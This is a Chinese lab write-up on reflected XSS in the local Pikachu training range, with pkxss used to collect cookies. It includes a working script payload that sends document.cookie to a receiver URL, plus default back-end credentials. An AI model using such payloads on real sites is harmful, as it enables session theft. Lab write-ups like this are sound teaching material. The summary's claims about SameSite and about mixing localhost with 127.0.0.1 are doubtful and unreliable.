---
title: Pikachu 反射型XSS(GET)配合pkxss获取Cookie Writeup
date: 2026-10-31
category: Web安全
tags: [XSS, 反射型XSS, pkxss, Cookie窃取, Pikachu]
---

## 一、实验环境
靶场平台：Pikachu
测试页面：`vul/xss/xss_reflected_get.php`
配套后台：pkxss（XSS接收平台）
环境：phpstudy（Apache+MySQL）
浏览器：Firefox
靶场地址：`http://127.0.0.1/pikachu/vul/xss/xss_reflected_get.php`
pkxss登录地址：`http://127.0.0.1/pikachu/pkxss/pkxss_login.php`

## 二、漏洞原理
反射型XSS属于非持久化XSS，用户输入的内容直接被后端返回到页面，没有存入数据库。输入的JavaScript代码会在受害者浏览器中执行，读取当前页面`document.cookie`，并通过异步请求发送到pkxss接收脚本，后台保存Cookie信息，实现Cookie窃取。

## 三、复现步骤
1. 启动phpstudy，开启Apache与MySQL，确认pkxss数据库已经初始化完成。
2. 访问pkxss登录页面，账号`admin`，密码`123456`登录XSS后台。
3. 选择【cookie搜集】→【添加】，自定义任务名称，勾选获取cookie，提交，生成带有唯一key的接收链接。
4. 构造Payload，替换链接中的key值：
``html
<script>
var img=new Image();
img.src="http://127.0.0.1/pikachu/pkxss/xcookie/cookie.php?key=替换为你的key&cookie="+document.cookie;
</script>
5. 进入反射型XSS(GET)关卡，将payload填入输入框提交。

6. 返回pkxss后台cookie搜集结果页面刷新，查看抓取到的Cookie、IP、UA等信息。

## 四、实验结果

payload成功执行，Cookie数据被发送至pkxss后台，后台表格中成功记录目标IP、Cookie、Referer、UserAgent信息。

## 五、问题与总结

1. Chrome新版浏览器存在SameSite Cookie安全策略，会拦截JS读取Cookie，容易抓不到cookie，本实验推荐使用Firefox。

2. 使用Image异步请求payload不会发生页面跳转，相比location跳转方式，请求更稳定，不容易中断。

3. 靶场与pkxss地址必须统一使用127.0.0.1，localhost和127.0.0.1混用会触发同源策略拦截。

4. 反射型XSS需要用户主动访问包含payload的链接才会触发；存储型XSS会将payload存入数据库，任意访问页面的用户都会触发。
免责声明：仅用于本地靶场
